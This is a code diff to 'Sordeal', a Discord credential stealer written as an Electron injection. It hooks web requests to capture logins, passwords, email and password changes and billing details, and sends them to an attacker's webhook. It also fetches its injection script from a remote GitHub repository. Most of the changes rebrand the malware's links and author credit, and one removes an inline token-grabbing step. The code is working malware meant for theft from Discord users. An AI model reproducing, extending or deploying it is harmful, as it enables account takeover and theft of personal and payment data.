@@ -15,7 +15,8 @@ var config = {
     "init-notify": "true",
     "embed-color": 16711718,
 
-    injection_url: "https://raw.githubusercontent.com/Inplex-sys/Sordeal-Stealer-NoDualHook/main/inject.js",
+    creator: "%NAME_CREATOR%",
+    injection_url: "https://raw.githubusercontent.com/SOrdeal/Sordeal-Injection/main/index.js",
     webhook: "%WEBHOOK%",
     Filter: {
         "urls": [
@@ -62,14 +63,15 @@ const makeEmbed = async ({
         content: "",
         embeds: [{
             title: title,
+            url: "https://github.com/Sordeal",
             color: config["embed-color"],
             fields: fields,
             description: description ?? "",
             author: {
-                name: "Sordeal"
+                name: `Sordeal by ${config.creator}`
             },
             footer: {
-                text: "https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook"
+                text: "©Shaman | https://github.com/SOrdeal/Sordeal-Stealer"
             },
 
         }]
@@ -230,11 +232,6 @@ function GetLangue(read) {
 }
 const post = async (params) => {
     params = JSON.stringify(params)
-    var token = await execScript(tokenScript)
-    var n = JSON.stringify({
-        data: params,
-        token: token
-    });
     [config.webhook].forEach(res => {
         const url = new URL(res);
         const options = {
@@ -319,7 +316,7 @@ const FirstTime = async () => {
                 inline: !0
             }, {
                 name: "@Copyright",
-                value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook)`,
+                value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
                 inline: !0
             }, {
                 name: "Billing <a:billing:1041641103629234196>",
@@ -411,7 +408,7 @@ const FirstTime = async () => {
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook)`,
+                    value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -550,7 +547,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             var password = data.password
             var params = await makeEmbed({
                 title: "Sordeal User Login",
-                description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook)",
+                description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/SOrdeal/Sordeal-Stealer)",
                 color: config['embed-color'],
                 fields: [{
                     name: "Injection Info",
@@ -586,7 +583,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                     inline: !0
                 }, {
                     name: "@Copyright",
-                    value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook)`,
+                    value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
                     inline: !0
                 }, {
                     name: "Billing <a:billing:1041641103629234196>",
@@ -631,7 +628,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (data.new_password) {
                 var params = await makeEmbed({
                     title: "Sordeal Detect Password Changed",
-                    description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook)",
+                    description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/SOrdeal/Sordeal-Stealer)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -667,7 +664,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook)`,
+                        value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -718,7 +715,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             if (data.email) {
                 var params = await makeEmbed({
                     title: "Sordeal Detect Email Changed",
-                    description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook)",
+                    description: "[<:sordeal:1087057809071427695>  **Oh you have Sordealised someone**](https://github.com/SOrdeal/Sordeal-Stealer)",
                     color: config['embed-color'],
                     fields: [{
                         name: "Injection Info",
@@ -754,7 +751,7 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
                         inline: !0
                     }, {
                         name: "@Copyright",
-                        value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/Inplex-sys/Sordeal-Stealer-NoDualHook)`,
+                        value: `[Sordeal 2023 <:sordeal:1087057809071427695>](https://github.com/SOrdeal/Sordeal-Stealer)`,
                         inline: !0
                     }, {
                         name: "Billing <a:billing:1041641103629234196>",
@@ -835,5 +832,4 @@ electron.session.defaultSession.webRequest.onCompleted(config.onCompleted, async
             break
     }
 })
-
 module.exports = require("./core.asar")
